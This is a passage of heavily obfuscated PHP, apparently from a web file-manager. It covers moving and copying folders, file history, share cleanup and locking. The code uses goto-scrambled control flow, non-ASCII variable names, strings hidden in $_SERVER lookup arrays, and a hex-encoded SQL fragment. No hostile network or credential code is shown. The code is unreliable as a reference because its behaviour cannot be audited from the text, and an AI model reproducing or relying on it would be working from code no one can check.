&& $e£‚é’¬Ã∂ != $dã£ñ˘»î∑[$b≠úï§Ìî⁄[28]]) { $eêèÁì Áü = $this->fileNameExist($bö¨ΩöÔ©ß, $e£‚é’¬Ã∂); if ($eêèÁì Áü && $dã£ñ˘»î∑[$b≠úï§Ìî⁄[375]] == $b≠úï§Ìî⁄[472]) { goto E‚æ·âÁå„; bÁˆ¨ÈºÎÎ: $this->removeNow($f∞˜Íâﬁ‰÷, !1); $this->folderSizeReset($bö¨ΩöÔ©ß); Hook::trigger($b≠úï§Ìî⁄[536], $A§àÁ˘‰¨Æ); goto Féßå÷àÉˆ; E‚æ·âÁå„: $aîÊä⁄⁄⁄∑ = $this->sourceInfo($eêèÁì Áü); $A≈“Ôü—É® = $this->fileHistory($aîÊä⁄⁄⁄∑, $dã£ñ˘»î∑[$b≠úï§Ìî⁄[423]], $dã£ñ˘»î∑[$b≠úï§Ìî⁄[87]]); if (!$A≈“Ôü—É®) { Model($b≠úï§Ìî⁄[426])->remove($dã£ñ˘»î∑[$b≠úï§Ìî⁄[423]]); } goto bÁˆ¨ÈºÎÎ; Féßå÷àÉˆ: return $eêèÁì Áü; goto b≈äµã∞çÉ; b≈äµã∞çÉ: } } goto e‚ïõ¥„œú; e‚ïõ¥„œú: $AŸÉ≠í ‰ï = $e£‚é’¬Ã∂ ? $e£‚é’¬Ã∂ : $dã£ñ˘»î∑[$b≠úï§Ìî⁄[28]]; $this->lockMoveStart($f∞˜Íâﬁ‰÷); $this->lockWriteStart($bö¨ΩöÔ©ß, $AŸÉ≠í ‰ï); goto F¬Í¨Ë˜ÖÌ; C££œÜ¡Óú: Model($b≠úï§Ìî⁄[174])->linkAdd($câÑ®ë·â©[$b≠úï§Ìî⁄[505]]); if ($cÃéäûçπô && $câÑ®ë·â©[$b≠úï§Ìî⁄[537]]) { $this->removeNow($f∞˜Íâﬁ‰÷, !1); } $this->lockMoveEnd($f∞˜Íâﬁ‰÷); goto Aõ°≠Ê◊ùÙ; a«ÀÎçï¬≠: $b≠úï§Ìî⁄ =& $_SERVER[Æ¡î¢≠¯™]; $dã£ñ˘»î∑ = $this->sourceInfo($f∞˜Íâﬁ‰÷); $cÖŒΩ«›ÔÑ = $this->sourceInfo($bö¨ΩöÔ©ß); goto eì∆ãÚ⁄¡å; eì∆ãÚ⁄¡å: $A§àÁ˘‰¨Æ = $this->pathInfoMore($f∞˜Íâﬁ‰÷); if ($this->isParentOf($f∞˜Íâﬁ‰÷, $bö¨ΩöÔ©ß)) { return !1; } if (!$dã£ñ˘»î∑ || !$cÖŒΩ«›ÔÑ || $cÖŒΩ«›ÔÑ[$b≠úï§Ìî⁄[375]] != $b≠úï§Ìî⁄[93]) { return !1; } goto a ‚ëµ’†¯; Aõ°≠Ê◊ùÙ: $this->lockWriteEnd($bö¨ΩöÔ©ß, $AŸÉ≠í ‰ï); $this->folderSizeReset($dã£ñ˘»î∑[$b≠úï§Ìî⁄[465]]); $this->folderSizeReset($bö¨ΩöÔ©ß); goto BÏòñÚ÷®ˆ; F¬Í¨Ë˜ÖÌ: $câÑ®ë·â© = array($b≠úï§Ìî⁄[505] => array(), $b≠úï§Ìî⁄[537] => !1); $this->clearShare($f∞˜Íâﬁ‰÷, $bö¨ΩöÔ©ß); $cÃéäûçπô = $this->fileNameExistCache($bö¨ΩöÔ©ß, $dã£ñ˘»î∑[$b≠úï§Ìî⁄[28]]); goto EÍ´¡‚—™Ó; d‘‚–ﬁÒÙî: Model($b≠úï§Ìî⁄[509])->eventMove($f∞˜Íâﬁ‰÷, $dã£ñ˘»î∑[$b≠úï§Ìî⁄[465]], $bö¨ΩöÔ©ß); Hook::trigger($b≠úï§Ìî⁄[536], $A§àÁ˘‰¨Æ); return $b––á”ùÉÙ; goto CÙÍÿõŒÒÜ; CÙÍÿõŒÒÜ: } private function _move($câ∞ π›Öä, $Aê∑èÏ•±‚, $eçÈÈòû»Œ, &$C÷â∏ÙﬂƒØ, $eãß°åüÔ˜ = '') { goto DÊß√ÌàÂ÷; AÑÇ˘Ï≈º§: $this->lockWriteStart($Aê∑èÏ•±‚, $d∂ññ∞ºü≠); if (!$f®°ŸÏÕçÆ) { return $this->_moveForce($câ∞ π›Öä, $Aê∑èÏ•±‚, $d∂ññ∞ºü≠); } $a‹πÜ“≤ΩÛ = $f®°ŸÏÕçÆ; goto AÒÍÕÇ¿⁄®; AÒÍÕÇ¿⁄®: $d≤ı¥öﬁè‚ = !1; if ($bÉíœ˘–∂≥) { if ($eçÈÈòû»Œ == REPEAT_RENAME_FOLDER) { $d∂ññ∞ºü≠ = $this->fileNameAuto($Aê∑èÏ•±‚, $d∂ññ∞ºü≠, $eçÈÈòû»Œ, $bÉíœ˘–∂≥); $a‹πÜ“≤ΩÛ = $this->_moveForce($câ∞ π›Öä, $Aê∑èÏ•±‚, $d∂ññ∞ºü≠); } else { if ($eçÈÈòû»Œ == REPEAT_RENAME_FOLDER) { $eçÈÈòû»Œ = REPEAT_RENAME; } $fπ∆‡ê Ç√ = $this->_childrenListSelect($câ∞ π›Öä); foreach ($fπ∆‡ê Ç√ as $b÷ôë„†ïà) { $this->_move($b÷ôë„†ïà[$A äÜâ∂¥í[374]], $f®°ŸÏÕçÆ, $eçÈÈòû»Œ, $C÷â∏ÙﬂƒØ); } $d≤ı¥öﬁè‚ = !0; } } else { if ($eçÈÈòû»Œ == REPEAT_SKIP) { $d≤ı¥öﬁè‚ = !0; } else { if ($eçÈÈòû»Œ == REPEAT_RENAME || $eçÈÈòû»Œ == REPEAT_RENAME_FOLDER) { $d∂ññ∞ºü≠ = $this->fileNameAuto($Aê∑èÏ•±‚, $d∂ññ∞ºü≠, $eçÈÈòû»Œ, $bÉíœ˘–∂≥); $a‹πÜ“≤ΩÛ = $this->_moveForce($câ∞ π›Öä, $Aê∑èÏ•±‚, $d∂ññ∞ºü≠); } else { if ($eçÈÈòû»Œ == REPEAT_REPLACE) { $Bõ≠¶∞áÿÆ = $this->sourceInfoCache($f®°ŸÏÕçÆ); $EèÛû®Õïä = $this->fileHistory($Bõ≠¶∞áÿÆ, $aπ∏ú±Ïº€[$A äÜâ∂¥í[423]], $aπ∏ú±Ïº€[$A äÜâ∂¥í[87]]); if ($EèÛû®Õïä) { $C÷â∏ÙﬂƒØ[$A äÜâ∂¥í[505]][] = $aπ∏ú±Ïº€[$A äÜâ∂¥í[423]]; } else { $d≤ı¥öﬁè‚ = !0; } } } } } if ($d≤ı¥öﬁè‚ && !$C÷â∏ÙﬂƒØ[$A äÜâ∂¥í[537]]) { $C÷â∏ÙﬂƒØ[$A äÜâ∂¥í[537]] = !0; } goto b∞ª°ü∏ÍÇ; b»Àè•í¬À: $d∂ññ∞ºü≠ = $eãß°åüÔ˜ ? $eãß°åüÔ˜ : $aπ∏ú±Ïº€[$A äÜâ∂¥í[28]]; $f®°ŸÏÕçÆ = $this->fileNameExistCache($Aê∑èÏ•±‚, $d∂ññ∞ºü≠); $this->lockMoveStart($câ∞ π›Öä); goto AÑÇ˘Ï≈º§; DÊß√ÌàÂ÷: $A äÜâ∂¥í =& $_SERVER[Æ¡î¢≠¯™]; $aπ∏ú±Ïº€ = $this->sourceInfo($câ∞ π›Öä); $bÉíœ˘–∂≥ = $aπ∏ú±Ïº€[$A äÜâ∂¥í[375]] == $A äÜâ∂¥í[93]; goto b»Àè•í¬À; b∞ª°ü∏ÍÇ: return $a‹πÜ“≤ΩÛ; goto A—çå‰ú◊—; A—çå‰ú◊—: } private function _moveForce($AØﬂ†îé¥•, $e´ßÚÀ›”õ, $Dúè∆ÛæÖä) { goto a¥ΩÖúÆÙà; a¥ΩÖúÆÙà: $B·”„ªÂƒÃ =& $_SERVER[Æ¡î¢≠¯™]; $dë∂Ô˘Ÿ¨â = $this->sourceInfo($AØﬂ†îé¥•); $Eì†íÏËì⁄ = $this->sourceInfo($e´ßÚÀ›”õ); goto aÓ∏©‚¶§à; aÓ∏©‚¶§à: $eÓòèŒä∫Ò = $dë∂Ô˘Ÿ¨â[$B·”„ªÂƒÃ[375]] == $B·”„ªÂƒÃ[93]; $c¨õÙ◊ëìÒ = array($B·”„ªÂƒÃ[373] => $Eì†íÏËì⁄[$B·”„ªÂƒÃ[374]], $B·”„ªÂƒÃ[529] => $Eì†íÏËì⁄[$B·”„ªÂƒÃ[463]] . $Eì†íÏËì⁄[$B·”„ªÂƒÃ[374]] . $B·”„ªÂƒÃ[47], $B·”„ªÂƒÃ[525] => $Eì†íÏËì⁄[$B·”„ªÂƒÃ[376]], $B·”„ªÂƒÃ[526] => $Eì†íÏËì⁄[$B·”„ªÂƒÃ[460]], $B·”„ªÂƒÃ[528] => USER_ID, $B·”„ªÂƒÃ[391] => $Dúè∆ÛæÖä); $EÙÔÌ… ·ƒ = $dë∂Ô˘Ÿ¨â[$B·”„ªÂƒÃ[376]] == SourceModel::TYPE_GROUP && $Eì†íÏËì⁄[$B·”„ªÂƒÃ[376]] == SourceModel::TYPE_GROUP && $dë∂Ô˘Ÿ¨â[$B·”„ªÂƒÃ[460]] == $Eì†íÏËì⁄[$B·”„ªÂƒÃ[460]]; goto DãûË√…ôö; fàº˘Êˆñﬁ: if ($eÓòèŒä∫Ò) { $CëÒâ™∂ÎÉ = array($B·”„ªÂƒÃ[529] => array($B·”„ªÂƒÃ[487], $dë∂Ô˘Ÿ¨â[$B·”„ªÂƒÃ[463]] . $dë∂Ô˘Ÿ¨â[$B·”„ªÂƒÃ[374]] . $B·”„ªÂƒÃ[488])); $F◊†áàç‡Ï = $dë∂Ô˘Ÿ¨â[$B·”„ªÂƒÃ[463]] . $dë∂Ô˘Ÿ¨â[$B·”„ªÂƒÃ[374]] . $B·”„ªÂƒÃ[47]; $EËÉÿ…—‰Ì = $Eì†íÏËì⁄[$B·”„ªÂƒÃ[463]] . $Eì†íÏËì⁄[$B·”„ªÂƒÃ[374]] . $B·”„ªÂƒÃ[47] . $dë∂Ô˘Ÿ¨â[$B·”„ªÂƒÃ[374]] . $B·”„ªÂƒÃ[47]; $c˜´ı⁄¡ÇÎ = array($B·”„ªÂƒÃ[529] => array($B·”„ªÂƒÃ[538], "\x72\x65\x70\154\141\143\145\x28\x70\141\162\145\156\164\114\x65\x76\145\154\x2c\x27{$F◊†áàç‡Ï}\x27\x2c\x27{$EËÉÿ…—‰Ì}\47\x29"), $B·”„ªÂƒÃ[525] => $Eì†íÏËì⁄[$B·”„ªÂƒÃ[376]], $B·”„ªÂƒÃ[526] => $Eì†íÏËì⁄[$B·”„ªÂƒÃ[460]]); if ($dÙ°Ëöº¨ú) { $c˜´ı⁄¡ÇÎ[$B·”„ªÂƒÃ[400]] = 0; } $this->where($CëÒâ™∂ÎÉ)->data($c˜´ı⁄¡ÇÎ)->save(); } $this->where(array($B·”„ªÂƒÃ[388] => $AØﬂ†îé¥•))->data($c¨õÙ◊ëìÒ)->save(); return $AØﬂ†îé¥•; goto c§æÛ¨≈≈–; DãûË√…ôö: if (!$EÙÔÌ… ·ƒ) { Model($B·”„ªÂƒÃ[458])->authClear($AØﬂ†îé¥•); } $dÙ°Ëöº¨ú = $dë∂Ô˘Ÿ¨â[$B·”„ªÂƒÃ[401]] == $B·”„ªÂƒÃ[93] && $Eì†íÏËì⁄[$B·”„ªÂƒÃ[401]] != $B·”„ªÂƒÃ[93]; if ($dÙ°Ëöº¨ú) { $c¨õÙ◊ëìÒ[$B·”„ªÂƒÃ[400]] = 0; } goto fàº˘Êˆñﬁ; c§æÛ¨≈≈–: } private function clearShare($F∫Õ‹√îﬁ¨, $F ÉºØ£ÉÖ) { goto dß¨ÓÒØ–ç; dß¨ÓÒØ–ç: $F”≥óÏÑß¢ =& $_SERVER[Æ¡î¢≠¯™]; $EÕÎ∑∑Ôì√ = $this->sourceInfo($F∫Õ‹√îﬁ¨); $Bê∫õÓ¬ŒÒ = $this->sourceInfo($F ÉºØ£ÉÖ); goto cä“∏íèéØ; e±¢é¶Ü∂: Model($F”≥óÏÑß¢[540])->where($FûËÚÕÕÓ˘)->save(array($F”≥óÏÑß¢[452] => 0)); Model($F”≥óÏÑß¢[541])->where($FûËÚÕÕÓ˘)->delete(); goto AµåÛÿˆáÈ; cä“∏íèéØ: if ($EÕÎ∑∑Ôì√[$F”≥óÏÑß¢[460]] == $Bê∫õÓ¬ŒÒ[$F”≥óÏÑß¢[460]] && $EÕÎ∑∑Ôì√[$F”≥óÏÑß¢[376]] == $F”≥óÏÑß¢[539]) { return; } $FûËÚÕÕÓ˘ = array($F”≥óÏÑß¢[463] => array($F”≥óÏÑß¢[487], $EÕÎ∑∑Ôì√[$F”≥óÏÑß¢[463]] . $F∫Õ‹√îﬁ¨ . $F”≥óÏÑß¢[488])); $BóË¡ÆéÊ„ = $this->field($F”≥óÏÑß¢[388])->where($FûËÚÕÕÓ˘)->getField($F”≥óÏÑß¢[374], !0); goto c ™›™Öå®; c ™›™Öå®: if (!$BóË¡ÆéÊ„) { return; } $FûËÚÕÕÓ˘ = array($F”≥óÏÑß¢[374] => array($F”≥óÏÑß¢[7], $BóË¡ÆéÊ„), $F”≥óÏÑß¢[452] => 1); $E⁄ëÜπ” û = Model($F”≥óÏÑß¢[540])->field($F”≥óÏÑß¢[445])->where($FûËÚÕÕÓ˘)->select(); goto e‘⁄áÁÍú√; e‘⁄áÁÍú√: if (!$E⁄ëÜπ” û) { return; } $E⁄ëÜπ” û = array_to_keyvalue($E⁄ëÜπ” û, $F”≥óÏÑß¢[33], $F”≥óÏÑß¢[445]); $FûËÚÕÕÓ˘ = array($F”≥óÏÑß¢[445] => array($F”≥óÏÑß¢[7], $E⁄ëÜπ” û)); goto e±¢é¶Ü∂; AµåÛÿˆáÈ: } public function copyFolderFromIO($Cä≈ä—â √, $C“ëî¡√ßÒ, $aÀ’◊◊æß¯, $BÍö†•µ≤‰, $CÌä‡ŸÔÕ¯, $Bÿ€áŸ®ïä = false) { goto cÜ≈®¡¬ò∫; bÌÎÉµÈˆ∫: if ($b°‡∆êÙ™®) { $this->_childrenAllMake($b°‡∆êÙ™®); } Hook::trigger($F‰ùÔë”œã[543]); $this->_copyChildTo($Cä≈ä—â √, $C“ëî¡√ßÒ, $còëÔ∫í∫ , $BÍö†•µ≤‰, $bÌˆˆ“€‰É, $CÌä‡ŸÔÕ¯); goto FÜ¶Ò–¶ù∆; cÜ≈®¡¬ò∫: $F‰ùÔë”œã =& $_SERVER[Æ¡î¢≠¯™]; $bÌˆˆ“€‰É = array($F‰ùÔë”œã[506] => array(), $F‰ùÔë”œã[507] => array(), $F‰ùÔë”œã[505] => array(), $F‰ùÔë”œã[542] => array()); $Cïò”§¥Ü¬ = $Bÿ€áŸ®ïä ? $Bÿ€áŸ®ïä : $Cä≈ä—â √->getPathName($Cä≈ä—â √->pathThis($C“ëî¡√ßÒ)); goto d≈ü€∂¬üã; fü˜èØâﬁÏ: $this->updateModifyTime($aÀ’◊◊æß¯); return $còëÔ∫í∫ ; goto b•ñ£≠ÿ±Æ; d≈ü€∂¬üã: $b°‡∆êÙ™® = $this->fileNameExist($aÀ’◊◊æß¯, $Cïò”§¥Ü¬); $còëÔ∫í∫  = $this->mkdir($aÀ’◊◊æß¯, $Cïò”§¥Ü¬, $BÍö†•µ≤‰); if (!$b°‡∆êÙ™® || $BÍö†•µ≤‰ == REPEAT_RENAME_FOLDER) { $BÍö†•µ≤‰ = !1; } goto bÌÎÉµÈˆ∫; b¢¡§ß≠…∏: Model($F‰ùÔë”œã[508])->addAll($bÌˆˆ“€‰É[$F‰ùÔë”œã[506]], array(), !0); Model($F‰ùÔë”œã[509])->eventCopy($còëÔ∫í∫ ); $this->saveAll($bÌˆˆ“€‰É[$F‰ùÔë”œã[507]]); goto eÃÀ≈‹¢∆Ò; eÃÀ≈‹¢∆Ò: Model($F‰ùÔë”œã[426])->linkAdd($bÌˆˆ“€‰É[$F‰ùÔë”œã[505]]); Model($F‰ùÔë”œã[426])->remove($bÌˆˆ“€‰É[$F‰ùÔë”œã[542]]); $this->folderSizeReset($aÀ’◊◊æß¯); goto fü˜èØâﬁÏ; FÜ¶Ò–¶ù∆: Hook::trigger($F‰ùÔë”œã[544]); if ($còëÔ∫í∫ ) { $this->folderSizeResetChildren($còëÔ∫í∫ ); } $this->_childrenListClear(); goto b¢¡§ß≠…∏; b•ñ£≠ÿ±Æ: } private function _copyChildTo($a¢ú÷Ü‚–∫, $cº¶∫¨ë⁄æ, $cÆ—ÔÖÛ£™, $b‚´ú⁄ïøÇ, &$aè•ä◊Èìß, $aõΩÔóΩü–) { goto FÛê–≥œÑï; eÕªéº“¢Î: $F˜—¬çè•¨ = array_merge($C˘ñ’“≠£⁄[$eÉ∫„ÌıΩ¢[83]], $C˘ñ’“≠£⁄[$eÉ∫„ÌıΩ¢[84]]); $f˜ÃëãÎï™ = $this->_addFiles($a¢ú÷Ü‚–∫, $C˘ñ’“≠£⁄[$eÉ∫„ÌıΩ¢[83]], $aõΩÔóΩü–); $bÔºÉâ∞¶· = array(); goto FŒâ•Éñ€è; FÛê–≥œÑï: $eÉ∫„ÌıΩ¢ =& $_SERVER[Æ¡î¢≠¯™]; $bß®Í£π¥ê = $this->sourceInfoCache($cÆ—ÔÖÛ£™); $C˘ñ’“≠£⁄ = $a¢ú÷Ü‚–∫->listPath($cº¶∫¨ë⁄æ, !1, !0); goto eÕªéº“¢Î; FŒâ•Éñ€è: foreach ($F˜—¬çè•¨ as &$E¢◊π–·≤‡) { goto F±éàìæ’Ô; Eëƒõúçâá: $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[87]] = _get($E¢◊π–·≤‡, $eÉ∫„ÌıΩ¢[87], 0); $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[423]] = _get($E¢◊π–·≤‡, $eÉ∫„ÌıΩ¢[423], 0); if (!isset($E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[545]]) && $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[423]]) { $aè•ä◊Èìß[$eÉ∫„ÌıΩ¢[542]][] = $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[423]]; } goto FñΩÏõ‰æé; FñΩÏõ‰æé: if ($b‚´ú⁄ïøÇ) { $fôãáÕ«í» = $this->fileNameExistCache($cÆ—ÔÖÛ£™, $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[28]]); if ($fôãáÕ«í») { if ($E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[375]] || $b‚´ú⁄ïøÇ == REPEAT_SKIP) { continue; } if ($b‚´ú⁄ïøÇ == REPEAT_REPLACE) { $Díßÿ’ß¡“ = $this->sourceInfoCache($fôãáÕ«í»); $dª¨äıáÜå = $this->fileHistory($Díßÿ’ß¡“, $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[423]], $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[87]]); if ($dª¨äıáÜå) { $aè•ä◊Èìß[$eÉ∫„ÌıΩ¢[505]][] = $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[423]]; } continue; } else { if ($b‚´ú⁄ïøÇ == REPEAT_RENAME) { $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[28]] = $this->fileNameAutoCache($cÆ—ÔÖÛ£™, $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[28]], $b‚´ú⁄ïøÇ, !1); } } } } if (!$E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[375]] && $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[423]]) { $aè•ä◊Èìß[$eÉ∫„ÌıΩ¢[505]][] = $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[423]]; } $bÔºÉâ∞¶·[] = $this->_makeItemData($E¢◊π–·≤‡, $bß®Í£π¥ê, $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[28]]); goto aœä˘∏∏±å; F±éàìæ’Ô: if (isset($f˜ÃëãÎï™[$E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[28]]])) { $E¢◊π–·≤‡ = $f˜ÃëãÎï™[$E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[28]]]; } $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[375]] = $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[29]] == $eÉ∫„ÌıΩ¢[86]; $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[377]] = _get($E¢◊π–·≤‡, $eÉ∫„ÌıΩ¢[167], $eÉ∫„ÌıΩ¢[33]); goto Eëƒõúçâá; aœä˘∏∏±å: } unset($E¢◊π–·≤‡); if (!empty($bÔºÉâ∞¶·)) { $this->addAll($bÔºÉâ∞¶·); } goto CÂ‹ÀŒ™ƒ«; CÂ‹ÀŒ™ƒ«: $c«ñÒÎÉƒ¿ = $this->_childrenList($cÆ—ÔÖÛ£™); $c«ñÒÎÉƒ¿ = array_to_keyvalue($c«ñÒÎÉƒ¿, $eÉ∫„ÌıΩ¢[28]); foreach ($F˜—¬çè•¨ as $E¢◊π–·≤‡) { $Díßÿ’ß¡“ = $c«ñÒÎÉƒ¿[$E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[28]]]; $D∏Ë˜¯ñÜù = $Díßÿ’ß¡“[$eÉ∫„ÌıΩ¢[374]]; $this->_copyApplyMeta($Díßÿ’ß¡“, $aè•ä◊Èìß); if ($E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[29]] == $eÉ∫„ÌıΩ¢[86]) { $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[85]] = $a¢ú÷Ü‚–∫->getPathInner($E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[85]]); $this->_copyChildTo($a¢ú÷Ü‚–∫, $E¢◊π–·≤‡[$eÉ∫„ÌıΩ¢[85]], $D∏Ë˜¯ñÜù, $b‚´ú⁄ïøÇ, $aè•ä◊Èìß, $aõΩÔóΩü–); } } goto bÁµä—€ÕÜ; bÁµä—€ÕÜ: } private function _addFiles($eàïŒÂäÑó, $eÕÿÉ–ÂÇÛ, $F∫í¡÷™÷˜) { goto DçêÈÛ≈›§; CÎ¿®‚ÍÊµ: $C´»√«æ∆≈ = array($e∏Ü∏úõµà[170] => array($e∏Ü∏úõµà[7], array_keys($D¿ΩΩƒ˘∏Ç))); $aÏÊÂ’–£ï = $c≤àÆ˘ªéë->where($C´»√«æ∆≈)->select(); $aÏÊÂ’–£ï = $aÏÊÂ’–£ï ? $aÏÊÂ’–£ï : array(); goto AÕ±ŸË•©∏; DçêÈÛ≈›§: $e∏Ü∏úõµà =& $_SERVER[Æ¡î¢≠¯™]; if (!$eÕÿÉ–ÂÇÛ || count($eÕÿÉ–ÂÇÛ) == 0) { return array(); } $D¿ΩΩƒ˘∏Ç = array(); goto Fë¢ﬂÉﬁåà; f›óﬁµíœﬂ: $a®æÇÑó¯î = array(); foreach ($eÕÿÉ–ÂÇÛ as $düò‹ﬂ◊é„) { if (isset($düò‹ﬂ◊é„[$e∏Ü∏úõµà[545]]) && $düò‹ﬂ◊é„[$e∏Ü∏úõµà[545]]) { continue; } $B—¡πâÿ¥÷ = $eàïŒÂäÑó->getPathInner($düò‹ﬂ◊é„[$e∏Ü∏úõµà[85]]); $cÒû¶ãÍÙ’ = $c≤àÆ˘ªéë->addFileMake($B—¡πâÿ¥÷, $düò‹ﬂ◊é„[$e∏Ü∏úõµà[87]], $düò‹ﬂ◊é„[$e∏Ü∏úõµà[171]], $düò‹ﬂ◊é„[$e∏Ü∏úõµà[170]], $düò‹ﬂ◊é„[$e∏Ü∏úõµà[28]], $F∫í¡÷™÷˜); $a®æÇÑó¯î[] = $cÒû¶ãÍÙ’; } $c≤àÆ˘ªéë->addAll($a®æÇÑó¯î); goto CÎ¿®‚ÍÊµ; AÕ±ŸË•©∏: foreach ($aÏÊÂ’–£ï as $D√ºΩ≠˘Ì∞) { if (!isset($D¿ΩΩƒ˘∏Ç[$D√ºΩ≠˘Ì∞[$e∏Ü∏úõµà[170]]])) { continue; } $FÃØ„£∑Ì” =& $D¿ΩΩƒ˘∏Ç[$D√ºΩ≠˘Ì∞[$e∏Ü∏úõµà[170]]]; foreach ($FÃØ„£∑Ì” as &$A≠◊∞“´◊†) { $A≠◊∞“´◊†[$e∏Ü∏úõµà[423]] = $D√ºΩ≠˘Ì∞[$e∏Ü∏úõµà[423]]; } unset($A≠◊∞“´◊†); } $C›ÍÕõëß◊ = array(); foreach ($eÕÿÉ–ÂÇÛ as $cæ’Üé∫Ì¬) { $C›ÍÕõëß◊[$cæ’Üé∫Ì¬[$e∏Ü∏úõµà[28]]] = $cæ’Üé∫Ì¬; } goto FÍŸÙ‰˘çÙ; Fë¢ﬂÉﬁåà: foreach ($eÕÿÉ–ÂÇÛ as &$A≠◊∞“´◊†) { goto EÌÿã«ÃäÔ; EÌÿã«ÃäÔ: Hook::trigger($e∏Ü∏úõµà[546], $A≠◊∞“´◊†); $A≠◊∞“´◊†[$e∏Ü∏úõµà[85]] = $eàïŒÂäÑó->getPathInner($A≠◊∞“´◊†[$e∏Ü∏úõµà[85]]); $EÇÈõœ•úù = $eàïŒÂäÑó->hashSimple($A≠◊∞“´◊†[$e∏Ü∏úõµà[85]]); goto F·ÎŸ∏ü¡«; F·ÎŸ∏ü¡«: $d‹û—ä∂ƒ“ = $eàïŒÂäÑó->hashMd5($A≠◊∞“´◊†[$e∏Ü∏úõµà[85]]); if (strlen($d‹û—ä∂ƒ“) > 10 && !isset($D¿ΩΩƒ˘∏Ç[$d‹û—ä∂ƒ“])) { $D¿ΩΩƒ˘∏Ç[$d‹û—ä∂ƒ“] = array(); } $A≠◊∞“´◊†[$e∏Ü∏úõµà[171]] = $EÇÈõœ•úù; goto CûÓΩ´ªÏì; CûÓΩ´ªÏì: $A≠◊∞“´◊†[$e∏Ü∏úõµà[170]] = $d‹û—ä∂ƒ“; Hook::trigger($e∏Ü∏úõµà[547], $A≠◊∞“´◊†); $D¿ΩΩƒ˘∏Ç[$d‹û—ä∂ƒ“][] =& $A≠◊∞“´◊†; goto c«‚≠∏É∞Â; c«‚≠∏É∞Â: if (count($D¿ΩΩƒ˘∏Ç[$d‹û—ä∂ƒ“]) > 1) { $A≠◊∞“´◊†[$e∏Ü∏úõµà[545]] = !0; } goto eøÌÈ˘Ñ·≠; eøÌÈ˘Ñ·≠: } $C´»√«æ∆≈ = array($e∏Ü∏úõµà[170] => array($e∏Ü∏úõµà[7], array_keys($D¿ΩΩƒ˘∏Ç))); $c≤àÆ˘ªéë = Model($e∏Ü∏úõµà[548]); goto dê∏‘€ìêµ; dê∏‘€ìêµ: $aÏÊÂ’–£ï = $c≤àÆ˘ªéë->where($C´»√«æ∆≈)->select(); $aÏÊÂ’–£ï = $aÏÊÂ’–£ï ? $aÏÊÂ’–£ï : array(); foreach ($aÏÊÂ’–£ï as $D√ºΩ≠˘Ì∞) { if (!isset($D¿ΩΩƒ˘∏Ç[$D√ºΩ≠˘Ì∞[$e∏Ü∏úõµà[170]]])) { continue; } $aîä¢—¨ØÕ = $D¿ΩΩƒ˘∏Ç[$D√ºΩ≠˘Ì∞[$e∏Ü∏úõµà[170]]]; foreach ($aîä¢—¨ØÕ as &$A≠◊∞“´◊†) { $A≠◊∞“´◊†[$e∏Ü∏úõµà[423]] = $D√ºΩ≠˘Ì∞[$e∏Ü∏úõµà[423]]; $A≠◊∞“´◊†[$e∏Ü∏úõµà[545]] = !0; } unset($A≠◊∞“´◊†); } goto f›óﬁµíœﬂ; FÍŸÙ‰˘çÙ: return $C›ÍÕõëß◊; goto eﬁπÙÓÑ‘â; eﬁπÙÓÑ‘â: } } goto F∂Öü∑Öä¥; AÎÖƒﬂ⁄ê¬: function beforeShutdownFatalError($E‘‰€´—÷) { think_exception($E‘‰€´—÷); } $_SERVER[$_SERVER[âñö‚‚Ñ][48]] = $c’„€ËÀçä($_SERVER[$_SERVER[âñö‚‚Ñ][45]]); $aÍôΩ Èã = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto B¥¨˜÷∆ä ; b‚Íßë∏€Â: function Action($cŸ›èÉ€¢ = '') { goto f å√è‚ìÌ; fÓﬁÜ£â√ä: $Bπéûøå ◊ = strtolower($bºñ«ÑÀÉ”); if (isset($bÚ„«•ºÃ“[$Bπéûøå ◊])) { return $bÚ„«•ºÃ“[$Bπéûøå ◊]; } if (is_file($EÃîû˘öøè)) { include_once $EÃîû˘öøè; } goto D‰”ÃÃÒà∫; f å√è‚ìÌ: $Aßà±ˆÆÜ— =& $_SERVER[âñö‚‚Ñ]; static $bÚ„«•ºÃ“ = array(); $cŸ›èÉ€¢ = trim(str_replace($Aßà±ˆÆÜ—[4], $Aßà±ˆÆÜ—[5], $cŸ›èÉ€¢), $Aßà±ˆÆÜ—[4]); goto B∫œ•–«Ö‹; B∫œ•–«Ö‹: $F∆ëãëËÌô = explode($Aßà±ˆÆÜ—[5], $cŸ›èÉ€¢); $e‰Œ≤Õœ¥‘ = strtolower($F∆ëãëËÌô[0]); if (substr($e‰Œ≤Õœ¥‘, -6) == $Aßà±ˆÆÜ—[6]) { $cŸ›èÉ€¢ = substr($F∆ëãëËÌô[0], 0, -6); $bºñ«ÑÀÉ” = $cŸ›èÉ€¢ . $Aßà±ˆÆÜ—[7]; $EÃîû˘öøè = $Aßà±ˆÆÜ—[8]; if (isset($F∆ëãëËÌô[1]) && substr(strtolower($F∆ëãëËÌô[1]), -5) == $Aßà±ˆÆÜ—[9]) { $bºñ«ÑÀÉ” = $cŸ›èÉ€¢ . $F∆ëãëËÌô[1]; $EÃîû˘öøè = $Aßà±ˆÆÜ—[10] . $F∆ëãëËÌô[1] . $Aßà±ˆÆÜ—[11]; } else { if (count($F∆ëãëËÌô) == 3) { 